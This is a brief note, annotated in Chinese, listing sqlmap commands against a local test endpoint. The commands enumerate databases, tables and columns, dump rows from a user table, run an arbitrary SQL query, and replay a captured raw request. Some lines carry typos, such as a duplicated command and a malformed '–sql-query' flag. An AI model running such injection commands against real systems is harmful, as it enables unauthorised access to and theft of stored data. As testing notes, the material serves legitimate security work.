
sqlmap -u "http://localhost:8080/getInject?name=1" --dbs 查库

sqlmap -u "http://localhost:8080/getInject?name=1" --current-db 查当前使用库

sqlmap -u "http://localhost:8080/getInject?name=1" -D wu_biz_oc --tables 查表

sqlmap -u "http://localhost:8080/getInject?name=1" -D wu_biz_oc --tables 查表

sqlmap -u "http://localhost:8080/getInject?name=1" -D wu_biz_oc -T t_oc_order_apply --columns 查询字段

sqlmap -u "http://localhost:8080/getInject?name=1" -D wu_test_db -T t_user  --dump --where=id=1 -C emain  查询数据

sqlmap -u "http://localhost:8080/getInject?name=1" -D wu_test_db -T t_user --batch --smart –sql-query select *from t_user where name='1'


sqlmap -r "/Users/caiqiang.wu/Desktop/sqlmap/222" --dbs 指定抓包request raw 数据进行处理
